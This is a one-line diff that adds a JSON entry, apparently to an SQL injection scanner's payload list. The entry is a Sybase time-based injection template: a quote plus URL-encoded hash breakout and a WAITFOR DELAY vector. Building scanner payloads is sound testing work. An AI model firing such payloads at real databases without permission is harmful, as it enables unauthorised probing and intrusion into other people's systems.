@@ -1,0 +1,1 @@
+{"dbms": "sybase", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND (SELECT WAITFOR DELAY '0:0:5')", "comment": "sybase time: single+enc hash"}
